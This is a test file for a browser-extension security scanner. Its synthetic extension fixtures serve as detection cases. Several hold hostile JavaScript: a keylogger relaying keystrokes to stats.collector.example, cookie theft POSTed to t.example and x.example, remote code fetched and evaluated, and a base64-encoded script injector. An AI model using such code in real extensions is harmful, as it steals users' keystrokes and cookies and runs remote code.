"""End-to-end tests on small synthetic extensions (static fixtures only; never executed)."""

from extsentinel.models import Confidence, Severity

from .conftest import finding, rule_ids

MV3 = {"manifest_version": 3, "version": "1.0"}


def test_cross_context_keylogger_chain(analyze):
    """Keys captured in a content script, relayed to the service worker, sent to a third party."""
    report = analyze({
        "manifest.json": {**MV3, "name": "Helper", "background": {"service_worker": "bg.js"},
                          "content_scripts": [{"matches": ["<all_urls>"], "js": ["cs.js"]}]},
        "cs.js": "document.addEventListener('keydown', e => chrome.runtime.sendMessage({k: e.key}));",
        "bg.js": "chrome.runtime.onMessage.addListener((msg) => { fetch('https://stats.collector.example/k', {method:'POST', body: JSON.stringify(msg)}); });",
    })  # fmt: skip
    f = finding(report, "EXFIL_KEYSTROKES")
    assert f.severity == Severity.CRITICAL and f.confidence == Confidence.CONFIRMED
    assert "stats.collector.example" in f.title
    files = [e.file for e in f.evidence]
    assert files[0] == "cs.js" and files[-1] == "bg.js"  # trace crosses contexts
    assert "dest_class:third_party" in f.tags


def test_legitimate_shortcut_extension_is_quiet(analyze):
    report = analyze({
        "manifest.json": {**MV3, "name": "Shortcuts", "permissions": ["storage"],
                          "content_scripts": [{"matches": ["<all_urls>"], "js": ["cs.js"]}],
                          "action": {"default_popup": "popup.html"}},
        "cs.js": "document.addEventListener('keydown', e => { if (e.altKey && e.key === 'j') window.scrollBy(0, 100); });",
        "popup.html": "<html><body><input id=q><script src=popup.js></script></body></html>",
        # The user's own search typed into the popup goes to the extension's API: not page surveillance.
        "popup.js": "document.getElementById('q').addEventListener('change', e => fetch('https://api.shortcuts.example/s?q=' + e.target.value));",
    })  # fmt: skip
    severe = [f for f in report.findings if f.severity.rank >= Severity.MEDIUM.rank]
    assert severe == [], [f.title for f in severe]
    assert "KEY_LISTENER_IN_PAGES" in rule_ids(report)


def test_first_party_destination_is_less_severe(analyze):
    report = analyze({
        "manifest.json": {**MV3, "name": "Mail helper", "host_permissions": ["https://mail.example.com/*"],
                          "content_scripts": [{"matches": ["https://mail.example.com/*"], "js": ["cs.js"]}]},
        "cs.js": "fetch('https://api.mail.example.com/draft', {method: 'POST', body: document.body.innerText});",
    })  # fmt: skip
    f = finding(report, "EXFIL_PAGE_CONTENT")
    assert "dest_class:first_party" in f.tags
    assert f.severity.rank <= Severity.LOW.rank


def test_missing_permission_makes_flow_unreachable(analyze):
    report = analyze({
        "manifest.json": {**MV3, "name": "x", "background": {"service_worker": "bg.js"}},
        "bg.js": "chrome.cookies.getAll({}, c => fetch('https://x.example', {method:'POST', body: JSON.stringify(c)}));",
    })  # fmt: skip
    f = finding(report, "EXFIL_COOKIES")
    assert f.severity == Severity.INFO and "not declared" in f.description


def test_eval_blocked_by_mv3_csp_in_background(analyze):
    report = analyze({
        "manifest.json": {**MV3, "name": "x", "background": {"service_worker": "bg.js"}},
        "bg.js": "chrome.storage.local.get('cfg', r => { eval(r.cfg); });",
    })  # fmt: skip
    f = finding(report, "DYNAMIC_CODE_EXECUTION")
    assert f.severity == Severity.INFO and "blocks" in f.description


def test_remote_code_in_mv2_with_unsafe_eval(analyze):
    report = analyze({
        "manifest.json": {"manifest_version": 2, "version": "2.0", "name": "x",
                          "background": {"scripts": ["bg.js"]},
                          "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'"},
        "bg.js": "fetch('https://cfg.example/rules.js').then(r => r.text()).then(t => eval(t));",
    })  # fmt: skip
    assert finding(report, "REMOTE_CODE_EXECUTION").severity == Severity.CRITICAL
    assert "CSP_UNSAFE_EVAL" in rule_ids(report)


def test_executescript_files_become_content_scripts(analyze):
    report = analyze({
        "manifest.json": {**MV3, "name": "x", "permissions": ["scripting"], "host_permissions": ["<all_urls>"],
                          "background": {"service_worker": "bg.js"}},
        "bg.js": "chrome.tabs.onUpdated.addListener((id) => chrome.scripting.executeScript({target: {tabId: id}, files: ['inj.js']}));",
        "inj.js": "fetch('https://t.example/c', {method: 'POST', body: document.cookie});",
    })  # fmt: skip
    f = finding(report, "EXFIL_PAGE_COOKIES")
    assert f.confidence == Confidence.CONFIRMED
    ctx = {fr.path: fr.contexts for fr in report.files}
    assert [c.value for c in ctx["inj.js"]] == ["content_script"]


def test_unused_permissions_reported(analyze):
    report = analyze({
        "manifest.json": {**MV3, "name": "x", "permissions": ["history", "cookies", "storage"],
                          "background": {"service_worker": "bg.js"}},
        "bg.js": "chrome.history.search({text: ''}, items => chrome.storage.local.set({n: items.length}));",
    })  # fmt: skip
    unused = [f for f in report.findings if f.rule_id == "UNUSED_PERMISSION"]
    assert [f.title for f in unused] == ['Requests the "cookies" permission but its code never uses it']
    assert "READS_HISTORY_LOCAL" in rule_ids(report)


def test_obfuscated_and_encoded_payload(analyze):
    import base64

    payload = base64.b64encode(b"var s=document.createElement('script');s.src='https://x.example/a.js';document.head.appendChild(s);" * 2).decode()
    names = ";".join(f"var _0x{i:04x}=_0x{i + 1:04x}" for i in range(20))
    report = analyze({
        "manifest.json": {**MV3, "name": "x", "content_scripts": [{"matches": ["<all_urls>"], "js": ["cs.js"]}]},
        "cs.js": names + f";var blob='{payload}';",
    })  # fmt: skip
    assert finding(report, "OBFUSCATED_CODE").severity == Severity.HIGH
    assert "ENCODED_CODE_PAYLOAD" in rule_ids(report)
    assert report.coverage.obfuscated_files == ["cs.js"]


def test_minified_library_is_not_obfuscation(analyze):
    lib = "/*! jQuery v3.7.1 | (c) OpenJS Foundation */\n" + "!function(e,t){var n=" + "e.x+t.y;" * 800 + "}(window);"
    report = analyze({
        "manifest.json": {**MV3, "name": "x", "action": {"default_popup": "p.html"}},
        "p.html": "<script src=jquery.min.js></script>",
        "jquery.min.js": lib,
    })  # fmt: skip
    assert "OBFUSCATED_CODE" not in rule_ids(report)
    assert report.coverage.library_files == ["jquery.min.js"]


def test_manifest_risks(analyze):
    report = analyze({
        "manifest.json": {**MV3, "name": "__MSG_appName__", "default_locale": "en",
                          "update_url": "https://updates.example.net/crx",
                          "externally_connectable": {"matches": ["*://*/*"]},
                          "permissions": ["debugger", "proxy"], "host_permissions": ["<all_urls>"]},
        "_locales/en/messages.json": {"appName": {"message": "Localized Name"}},
    })  # fmt: skip
    assert report.name == "Localized Name"
    ids = rule_ids(report)
    assert {"UPDATE_URL_OFFSTORE", "EXTERNALLY_CONNECTABLE_ALL", "PERM_DEBUGGER", "PERM_PROXY", "HOST_ALL_SITES"} <= ids


def test_unparseable_script_falls_back_and_is_reported(analyze):
    report = analyze({
        "manifest.json": {**MV3, "name": "x", "content_scripts": [{"matches": ["<all_urls>"], "js": ["cs.js"]}]},
        # Mostly not JavaScript at all: neither parser can build a usable tree.
        "cs.js": "}}}} {{{{ <<<< >>>> #### %%%% " * 40 + "\ndocument.addEventListener('keydown', e => send(e.key)); eval(q);",
    })  # fmt: skip
    assert report.coverage.fallback_files == ["cs.js"]
    assert finding(report, "KEY_LISTENER_UNVERIFIED").confidence == Confidence.POSSIBLE
    assert "CODE_EXEC_UNVERIFIED" in rule_ids(report)


def test_keyword_baseline_flags_benign_code(analyze):
    """The baseline exists to quantify false positives the data-flow mode avoids."""
    files = {
        "manifest.json": {**MV3, "name": "x", "content_scripts": [{"matches": ["<all_urls>"], "js": ["cs.js"]}]},
        "cs.js": "document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); }); fetch('https://api.example/ping');",
    }
    keyword = analyze(files, mode="keyword")
    dataflow = analyze(files)
    assert any(f.severity == Severity.HIGH for f in keyword.findings)
    assert not any(f.severity.rank >= Severity.MEDIUM.rank for f in dataflow.findings)
